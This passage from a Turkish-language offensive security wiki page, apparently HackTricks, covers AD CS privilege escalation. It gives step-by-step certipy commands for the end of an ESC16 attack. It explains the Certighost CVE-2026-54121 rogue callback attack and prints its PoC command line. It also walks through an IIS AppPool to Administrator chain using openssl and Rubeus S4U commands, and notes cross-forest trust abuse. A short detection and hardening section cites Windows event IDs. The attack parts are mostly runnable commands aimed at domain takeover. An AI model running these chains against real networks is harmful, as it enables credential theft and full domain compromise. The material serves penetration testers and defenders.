**Adım 4: ESC16-vulnerable CA üzerindeki _uygun herhangi bir client authentication template_'tan (ör. "User") "victim" kullanıcı olarak bir certificate request edin.** CA ESC16'e karşı vulnerable olduğundan, template'in bu extension için özel settings'lerinden bağımsız olarak issued certificate'tan SID security extension'ı otomatik olarak çıkarır. Kerberos credential cache environment variable'ını ayarlayın (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Ardından sertifikayı isteyin:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Adım 5: "victim" hesabının UPN'sini geri döndürün.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**6. Adım: Hedef yöneticisi olarak kimlik doğrulaması yapın.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Açıklama

**Certighost**, CA'nın verilen sertifikaya yerleştirilmesi gereken kimliği çözümlemek için requester tarafından sağlanan request attributes'lara güvendiği bir **AD CS enrollment chase / callback path**'i kötüye kullanır. Public PoC'de hazırlanmış request şunları içerir:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA'nın bağlantı kuracağı saldırgan kontrollü host/IP
- **`rmd`**: Taklit edilecek **hedef Domain Controller DNS name**

CA bu chase'i takip ederse, **SMB/LSA (`445`)** ve **LDAP (`389`)** üzerinden saldırgana bağlanır. Saldırgan, callback session'ın geçerli bir domain principal olarak authenticate olması için **gerçek bir machine account** (genellikle varsayılan **`ms-DS-MachineAccountQuota`** kullanılarak oluşturulur) kullanır; ancak rogue services bunun yerine **hedef DC'nin** identity attributes'larını döndürür:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA, döndürülen identity'yi authenticated callback principal'a kriptografik olarak bağlamazsa, session saldırgan kontrollü machine account olarak authenticate olmuş olsa bile **Domain Controller** için bir certificate düzenleyebilir. Bu durum bug'ı kavramsal olarak **Certifried**'dan farklı kılar: Saldırgan, `dNSHostName` gibi AD attributes'larını yeniden yazmak yerine, **CA callback resolution sırasında identity data'yı değiştirir**.<sup>[[2]](#references)</sup>

**Yararlı ön koşullar:**

- Düşük yetkili **domain credentials**
- Bir computer account **oluşturabilme veya yeniden kullanabilme**
- **CA** tarafından saldırgan kontrollü **`389` ve `445` portlarına** network erişilebilirliği
- Vulnerable / unpatched CA request path (**14 Temmuz 2026** tarihli Microsoft update, **`cdc` için DC validation** ve ayrıca bir **resolved-SID comparison** ekledi)

Ortaya çıkan **`.pfx`**, daha sonra **PKINIT** için kullanılabilir; bu işlem bir **`.ccache`** üretir ve published PoC flow'da **hedef DC NT hash**'ini elde eder. Bu değer normalde **full domain compromise** için yeterlidir.

### Kötüye kullanım

Public PoC, chain'in tamamını otomatikleştirir:<sup>[[1]](#references)</sup>

1. Saldırgan kontrollü bir **machine account** oluşturur veya yeniden kullanır.
2. `389` ve `445` üzerinde **rogue LDAP and SMB/LSA listeners** başlatır.
3. Saldırgan kontrollü **`cdc`** ve hedef **`rmd`** attributes'larını içeren bir certificate request gönderir.
4. CA'nın controlled machine account olarak rogue listeners'a authenticate olmasını sağlar; ancak identity lookups yanıtlarında **hedef DC** attributes'larını döndürür.
5. CA tarafından imzalanmış bir **DC certificate** alır ve bunu **PKINIT** için kullanır.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC'den yararlı runtime flags:

- `--listener <ip>`: `cdc` içinde duyurulan callback IP'sini açıkça seçer
- `--computer-name <NAME$>`: yeni bir hesap oluşturmak yerine mevcut bir machine account'u yeniden kullanır

**Operasyonel notlar:**

- PoC, **privileged ports** `389` ve `445` üzerine bind olduğu için **root** gerektirir.
- Başarılı exploitation, yerel olarak bir **DC `.pfx`** ve **Kerberos `.ccache`** yazar.
- Certificate bir **Domain Controller account** ile eşleştiği için sonraki işlemler arasında **certificate-based Kerberos auth**, **DCSync** ve kurtarılan **machine NT hash**'in yeniden kullanılması bulunabilir.<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment to same-host Administrator

`ApplicationPoolIdentity` olarak çalışan bir IIS pool, network resources'a outbound erişim için host'un **computer account**'unu kullanır. Bu nedenle `IIS AppPool\<POOL>` olarak code execution, local token içinde düşük yetkili kalırken AD CS request'ini CA'nın `HOST$` olarak authenticate edeceği şekilde gönderebilir; bu, token impersonation veya Potato tarzı local elevation değil, outbound identity transition'dır.<sup>[[19]](#references)[[20]](#references)</sup>

Bu chain; domain-joined bir IIS host, RPC üzerinden erişilebilen bir Enterprise CA, computer'ın enrollment rights sahibi olduğu yayınlanmış bir machine-authentication template, PKINIT desteği ve KDC/SMB reachability gerektirir. Custom pool identity, outbound principal'i değiştirir; bu nedenle `HOST$` varsayımında bulunmadan önce pool'un gerçekten `ApplicationPoolIdentity` kullandığını doğrulayın.<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

Key pair ve CSR'yi IIS server'dan uzakta oluşturun ve private key'i saklayın. Compromised worker'dan **yalnızca CSR**'yi gönderin. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx), `CertificateAuthority.Request` nesnesini oluşturur, `CertificateTemplate:Machine` ayarını yapar, `ICertRequest::Submit` çağrısını gerçekleştirir ve verilen certificate'i döndürür. CA configuration string olarak `CAHOST\CA-NAME` kullanın; normal bir `Machine` template subject'i AD'den oluşturduğu için requester-supplied subject/SAN data gerekmez.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Döndürülen certificate'i **eşleşen ve saklanan key** ile birleştirin. `certutil -MergePFX machine_cert.cer machine_cert.pfx`, yalnızca Windows certificate'i erişilebilir bir private key ile zaten ilişkilendirebiliyorsa çalışır; ayrı PEM dosyaları için PKCS#12'yi açıkça oluşturun:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
PFX'i PKINIT için kullanın ve döndürülen computer TGT'sini hemen inject etmek yerine base64 olarak tutun:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self ve aynı host üzerinde service substitution

S4U2Self, bir service'in başka bir kullanıcının authorization data'sını içeren, **kendisine** yönelik bir ticket almasını sağlar. Computer TGT ile Rubeus, bu ticket'ı ayrıcalıklı bir kullanıcı için isteyebilir, döndürülen KRB-CRED içindeki service name'i CIFS olarak yeniden yazabilir ve ticket'ı inject edebilir. Bu, yerel “delegate to thyself” primitive'idir: S4U2Proxy veya bir `msDS-AllowedToDelegateTo` girdisi gerektirmez.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Değiştirilen ticket yalnızca **aynı computer account/key** üzerindeki servisler tarafından kullanılabilir (burada `HOST` üzerindeki CIFS). Diğer domain makineleri için yeniden kullanılabilir bir Administrator ticket değildir. Ayrıca gösterilen sonuç, Administrator olarak ayrıcalıklı SMB/filesystem erişimidir; yerel bir `NT AUTHORITY\SYSTEM` process elde etmek için hâlâ ayrı bir remote-execution adımı gerekir.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detection and hardening

- CA üzerinde, IIS server hesapları tarafından yapılan beklenmeyen `Machine`-template istekleri için Certification Services **4886** (request received) ve **4887** (issued) event'lerini ilişkilendirin.<sup>[[19]](#references)[[24]](#references)</sup>
- DC'lerde, certificate pre-authentication kullanıldığında **4768** event'i certificate alanlarını içerir; web-server hesapları için olağandışı PKINIT TGT istekleri konusunda alarm oluşturun. Ardından ayrıcalıklı bir impersonated identity ve aynı host ile ilişkili **4769** isteklerini inceleyin. Rubeus `/altservice`, KRB-CRED service name'i client-side yeniden yazdığından, DC-side 4769 service name'inin `cifs` olmasını zorunlu tutmayın.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe`'nin CA RPC endpoint'lerine erişmesini, beklenmeyen ASPX oluşturulmasını, administrative share'lere Kerberos-authenticated erişimi ve secrets-dumping etkinliğini araştırın. Mümkün olduğunda app-tier erişimini CA RPC/KDC/SMB ile sınırlandırın ve operasyonel olarak gerekli olmayan computer enrollment haklarını veya machine-authentication template'lerini kaldırın.<sup>[[19]](#references)</sup>

## Certificates ile Forest'ların Ele Geçirilmesi Passive Voice ile Açıklanmıştır

### Compromised CA'ler ile Forest Trust'ların Kırılması

**Cross-forest enrollment** yapılandırması nispeten kolay hâle getirilmiştir. Resource forest'taki **root CA certificate**, yöneticiler tarafından **account forest'lara publish edilir** ve resource forest'taki **enterprise CA** certificate'leri her account forest'taki **`NTAuthCertificates` ve AIA container'larına eklenir**. Açıklamak gerekirse bu düzenleme, **resource forest'taki CA'ya**, PKI'sını yönettiği diğer tüm forest'lar üzerinde tam control sağlar. Bu CA'nın **attackers tarafından compromise edilmesi durumunda**, hem resource forest hem de account forest'lardaki tüm kullanıcılar için certificate'ler onlar tarafından **forge edilebilir** ve böylece forest'ın security boundary'si kırılabilir.<sup>[[6]](#references)</sup>

### Foreign Principal'lara Verilen Enrollment Privileges

Multi-forest ortamlarda, **Authenticated Users veya foreign principal'lara** (Enterprise CA'nın ait olduğu forest dışındaki kullanıcılar/gruplar) **enrollment ve edit hakları** sağlayan **certificate template'lerini publish eden** Enterprise CA'ler konusunda dikkatli olunmalıdır.\
Bir trust üzerinden authentication gerçekleştirildiğinde, **Authenticated Users SID'si** AD tarafından kullanıcının token'ına eklenir. Bu nedenle bir domain, **Authenticated Users'a enrollment rights sağlayan** bir template'e sahip Enterprise CA içeriyorsa, bu template potansiyel olarak **farklı bir forest'taki kullanıcı tarafından enroll edilebilir**. Benzer şekilde, **enrollment rights bir template aracılığıyla foreign principal'a açıkça verildiğinde**, bir **cross-forest access-control relationship oluşturulur** ve bir forest'taki principal'ın **başka bir forest'taki template'e enroll olması** sağlanır.

Her iki senaryo da bir forest'tan diğerine **attack surface'in artmasına** yol açar. Certificate template'in ayarları, bir attacker tarafından foreign domain'de ek privileges elde etmek için exploit edilebilir.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost teknik analizi](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog'u](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services'in Kötüye Kullanılması](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, Yeni Authentication ve Request Method'ları ve daha fazlası](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Account Takeover için Key Trust Account Mapping'in Kötüye Kullanılması](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage Hikâyesi](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC üzerinden AD Certificate Services'e Relay](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM ile ADCS CA'ye Shell erişimi](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Sadece Başka Bir AD CS ESC Değil](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration ve Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself”i Yeniden Ele Almak](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – IIS AppPool'dan AD CS RPC Endpoint'i üzerinden Privilege Escalation](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: Bir Kerberos authentication ticket istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: Bir Kerberos service ticket istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
